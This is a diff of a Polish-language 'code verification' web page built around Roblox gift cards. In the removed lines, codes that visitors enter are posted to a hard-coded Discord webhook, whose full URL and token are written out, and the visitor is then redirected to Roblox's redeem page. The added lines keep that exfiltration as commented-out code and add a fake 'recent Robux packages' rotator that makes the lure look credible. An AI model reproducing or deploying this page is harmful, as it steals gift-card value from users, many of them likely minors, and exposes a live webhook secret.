@@ -3,8 +3,9 @@
 <head>
   <meta charset="UTF-8">
   <title>Weryfikacja kodu</title>
-  <link rel="icon" type="image/png" href="favicon.png">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
   <style>
+    :root{--accent:#4CAF50}
     body {
       margin: 0;
       height: 100vh;
@@ -16,11 +17,9 @@
       font-family: Arial, sans-serif;
       color: white;
     }
-    canvas {
-      position: absolute;
-      top: 0;
-      left: 0;
-    }
+    canvas { position: absolute; top: 0; left: 0; }
+
+    /* Główne okno */
     .content {
       position: relative;
       z-index: 1;
@@ -28,7 +27,9 @@
       padding: 20px 40px;
       border-radius: 10px;
       text-align: center;
+      min-width: 320px;
     }
+
     /* Panel po lewej */
     .side-box {
       position: absolute;
@@ -42,42 +43,35 @@
       text-align: center;
       z-index: 1;
     }
-    .side-box h3 {
-      margin: 0;
-      font-size: 20px;
-      font-weight: normal;
-    }
-    .side-box p {
-      margin-top: 10px;
-      font-size: 22px;
-      font-weight: bold;
-      color: #4CAF50; /* zielony */
-    }
+    .side-box h3 { margin: 0; font-size: 20px; font-weight: normal; }
+    .side-box p { margin-top: 10px; font-size: 22px; font-weight: bold; color: var(--accent); }
+
     input {
       padding: 10px;
       margin-top: 10px;
       border-radius: 5px;
       border: none;
       outline: none;
+      width: 100%;
+      box-sizing: border-box;
     }
     button {
       margin-top: 10px;
       padding: 10px 20px;
       border: none;
       border-radius: 5px;
-      background: #4CAF50;
+      background: var(--accent);
       color: white;
       cursor: pointer;
     }
-    button:hover {
-      background: #45a049;
-    }
-    /* Obrazki w rogach */
+    button:hover { background: #45a049; }
+
+    /* Logo top-left i giftcard bottom-right */
     .img-top-left {
       position: absolute;
       top: 20px;
       left: 20px;
-      width: 150px;
+      width: 120px;
       z-index: 2;
     }
     .img-bottom-right {
@@ -87,14 +81,88 @@
       width: 150px;
       z-index: 2;
     }
+
+    /* BOX OFERT (prawy górny) */
+    .offer-box {
+      position: absolute;
+      top: 20px;
+      right: 20px;
+      width: 240px;
+      background: rgba(0,0,0,0.65);
+      border-radius: 10px;
+      padding: 8px;
+      color: var(--accent);
+      font-weight: bold;
+      z-index: 3;
+      overflow: hidden;
+      box-sizing: border-box;
+    }
+
+    .offer-list {
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+    }
+
+    .offer-item {
+      background: rgba(255,255,255,0.03);
+      padding: 8px;
+      border-radius: 6px;
+      text-align: left;
+      font-size: 14px;
+      line-height: 1.2;
+      transform: translateY(0);
+      opacity: 1;
+      transition: transform 600ms ease, opacity 600ms ease;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .offer-item .left { font-size: 15px; }
+    .offer-item .right { font-size: 13px; color: rgba(255,255,255,0.75); font-weight: 600; }
+
+    /* pojawianie / znikanie */
+    .anim-in {
+      opacity: 0;
+      transform: translateY(-12px);
+      animation: animIn 600ms forwards;
+    }
+    .anim-out {
+      opacity: 1;
+      transform: translateY(0);
+      animation: animOut 600ms forwards;
+    }
+    @keyframes animIn {
+      from { opacity: 0; transform: translateY(-12px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+    @keyframes animOut {
+      from { opacity: 1; transform: translateY(0); }
+      to   { opacity: 0; transform: translateY(12px); }
+    }
+
+    /* responsywność: zmniejsz box na małych ekranach */
+    @media (max-width:520px){
+      .offer-box { right: 10px; left: 10px; width: auto; top: 12px; }
+      .img-top-left { width: 90px; top: 10px; left: 8px; }
+      .img-bottom-right { width: 120px; right: 8px; bottom: 8px; }
+      .side-box{ display:none; } /* ukryj boczny box na małych ekranach */
+    }
   </style>
 </head>
 <body>
   <canvas id="bg"></canvas>
 
-  <!-- Obrazki w rogach -->
-  <img src="logo.png" class="img-top-left" alt="Logo">
-  <img src="giftcard.png" class="img-bottom-right" alt="Gift Card">
+  <!-- logo i giftcard (nazwij pliki w repo: logo.png i giftcard.png) -->
+  <img src="logo.png" class="img-top-left" alt="Logo (logo.png)">
+  <img src="giftcard.png" class="img-bottom-right" alt="Giftcard (giftcard.png)">
+
+  <!-- PANEL OFERT (prawy górny) -->
+  <div class="offer-box" id="offerBox">
+    <div style="font-size:13px; color:rgba(255,255,255,0.8); margin-bottom:6px;">Aktualne pakiety Robux (3 ostatnie)</div>
+    <div class="offer-list" id="offerList"></div>
+  </div>
 
   <!-- Panel po lewej -->
   <div class="side-box">
@@ -112,72 +180,153 @@
   </div>
 
   <script>
-    // Animacja kwadratów w tle
+    // ---------- tło - animacja kwadratów ----------
     const canvas = document.getElementById('bg');
     const ctx = canvas.getContext('2d');
-    canvas.width = window.innerWidth;
-    canvas.height = window.innerHeight;
+    function resizeCanvas(){ canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
+    window.addEventListener('resize', resizeCanvas);
+    resizeCanvas();
 
     let squares = [];
-    for (let i = 0; i < 50; i++) {
+    for (let i = 0; i < 60; i++) {
       squares.push({
         x: Math.random() * canvas.width,
         y: Math.random() * canvas.height,
-        size: 5 + Math.random() * 5,
-        dx: (Math.random() - 0.5) * 2,
-        dy: (Math.random() - 0.5) * 2
+        size: 4 + Math.random() * 6,
+        dx: (Math.random() - 0.5) * 1.6,
+        dy: (Math.random() - 0.5) * 1.6
       });
     }
-
-    function animate() {
-      ctx.clearRect(0, 0, canvas.width, canvas.height);
+    function animateBg(){
+      ctx.clearRect(0,0,canvas.width,canvas.height);
       squares.forEach(sq => {
-        ctx.fillStyle = "#bbb";
+        ctx.fillStyle = "rgba(187,187,187,0.15)";
         ctx.fillRect(sq.x, sq.y, sq.size, sq.size);
-
-        sq.x += sq.dx;
-        sq.y += sq.dy;
-
-        if (sq.x < 0 || sq.x > canvas.width) sq.dx *= -1;
-        if (sq.y < 0 || sq.y > canvas.height) sq.dy *= -1;
+        sq.x += sq.dx; sq.y += sq.dy;
+        if (sq.x < -10) sq.x = canvas.width + 10;
+        if (sq.x > canvas.width + 10) sq.x = -10;
+        if (sq.y < -10) sq.y = canvas.height + 10;
+        if (sq.y > canvas.height + 10) sq.y = -10;
       });
-      requestAnimationFrame(animate);
+      requestAnimationFrame(animateBg);
     }
-    animate();
+    animateBg();
 
-    // Sprawdzanie kodu + wysyłka na webhook + przekierowanie
+    // ---------- sprawdzanie kodu (placeholder webhook) ----------
     function checkCode() {
       const code = document.getElementById("code").value;
       const message = document.getElementById("message");
-
-      // sprawdzamy, czy kod ma 15–30 znaków
       const regex = /^.{15,30}$/;
       if (!regex.test(code)) {
         message.textContent = "Błędny Kod!";
         return;
       }
-
       message.textContent = "Weryfikacja udana!";
-
-      // Adres webhooka Discord (wstaw swój)
-      const webhookURL = "https://discord.com/api/webhooks/1412869587812483155/Rlwfr3ujrFi8feJDj0qMMHB6uLiNwqzeiTtRr6BxfvfQMw3sdY7w6LtoHRrBA5RIbzRE";
-
-      // wysyłamy kod na webhook
-      fetch(webhookURL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ content: `Kod użytkownika: ${code}` })
-      }).catch(err => console.error(err));
-
-      // przekierowanie po 1 sekundzie
-      setTimeout(() => {
-        window.location.href = "https://www.roblox.com/redeem";
-      }, 10000);
+      // const webhookURL = "https://discord.com/api/webhooks/1412869587812483155/Rlwfr3ujrFi8feJDj0qMMHB6uLiNwqzeiTtRr6BxfvfQMw3sdY7w6LtoHRrBA5RIbzRE";
+      // fetch(webhookURL,{ method:"POST", headers:{"Content-Type":"application/json"}, body: JSON.stringify({ content: `Kod użytkownika: ${code}` }) }).catch(e=>console.error(e));
+      // setTimeout(()=> window.location.href = "https://www.roblox.com/redeem", 1000);
     }
 
-    window.addEventListener('resize', () => {
-      canvas.width = window.innerWidth;
-      canvas.height = window.innerHeight;
+    // ---------- ROTATOR OFERT (3 widoczne, rotacja co losowy czas między 150s a 320s) ----------
+    const offers = [
+      "100 Robux","175 Robux","200 Robux","400 Robux","570 Robux","800 Robux","860 Robux",
+      "1000 Robux","1200 Robux","1500 Robux","1700 Robux","2200 Robux","2500 Robux",
+      "2700 Robux","4000 Robux","4500 Robux","5250 Robux","10000 Robux","11000 Robux","17000 Robux"
+    ];
+
+    const offerListEl = document.getElementById('offerList');
+
+    // pokazujemy początkowe 3 oferty (weź pierwsze 3)
+    let currentIndex = 0;
+    function seedInitial(){
+      offerListEl.innerHTML = '';
+      // pokaż trzy początkowe oferty (ostatnie 3 z listy, żeby wyglądało jak "ostatnie")
+      for(let i = 0; i < 3; i++){
+        const idx = (currentIndex + i) % offers.length;
+        const el = createOfferEl(offers[idx]);
+        offerListEl.appendChild(el);
+      }
+      // ustaw index na następny po tych 3
+      currentIndex = (currentIndex + 3) % offers.length;
+    }
+
+    function createOfferEl(text){
+      const wrapper = document.createElement('div');
+      wrapper.className = 'offer-item';
+      const left = document.createElement('div');
+      left.className = 'left';
+      left.textContent = text;
+      const right = document.createElement('div');
+      right.className = 'right';
+      right.textContent = 'Robux';
+      wrapper.appendChild(left);
+      wrapper.appendChild(right);
+      return wrapper;
+    }
+
+    // wykonaj rotację: usuń dolny element z animacją, przesuwamy, dodajemy nowy na górę z anim-in
+    function rotateOnce(){
+      const items = offerListEl.querySelectorAll('.offer-item');
+      if(items.length === 0){
+        // jeśli puste, seeduj
+        seedInitial();
+        scheduleNext();
+        return;
+      }
+
+      const bottom = items[items.length - 1];
+      // oznacz bottom jako anim-out
+      bottom.classList.add('anim-out');
+
+      // po czasie animacji usuwamy bottom i wstawiamy nowy na górze
+      setTimeout(()=> {
+        // usuń element dolny z DOM
+        if (bottom.parentNode) bottom.parentNode.removeChild(bottom);
+
+        // stwórz nowy element z następną ofertą
+        const newOfferText = offers[currentIndex % offers.length];
+        currentIndex = (currentIndex + 1) % offers.length;
+        const newEl = createOfferEl(newOfferText);
+        // dodaj klasę anim-in żeby ładnie się pojawił
+        newEl.classList.add('anim-in');
+
+        // wstaw na początek listy
+        if (offerListEl.firstChild) {
+          offerListEl.insertBefore(newEl, offerListEl.firstChild);
+        } else {
+          offerListEl.appendChild(newEl);
+        }
+
+        // po chwili usuń klasę anim-in (żeby następne pojawienie było świeże)
+        setTimeout(()=> newEl.classList.remove('anim-in'), 700);
+
+        // schedule next rotation
+        scheduleNext();
+      }, 620); // trochę więcej niż CSS animation (600ms)
+    }
+
+    // losowy interwał między 150s a 320s (w ms)
+    function randomIntervalMs(){
+      const min = 150000; // 150s
+      const max = 320000; // 320s
+      return Math.floor(Math.random() * (max - min + 1)) + min;
+    }
+
+    let rotationTimer = null;
+    function scheduleNext(){
+      const t = randomIntervalMs();
+      // dla debugowania odkomentuj poniższą linię (wyświetla w konsoli czas do następnej rotacji)
+      // console.log('Next rotation in (s):', Math.round(t/1000));
+      rotationTimer = setTimeout(rotateOnce, t);
+    }
+
+    // start
+    seedInitial();
+    scheduleNext();
+
+    // ---------- opcjonalnie: wyczyść timer przy unload ----------
+    window.addEventListener('beforeunload', ()=> {
+      if (rotationTimer) clearTimeout(rotationTimer);
     });
   </script>
 </body>
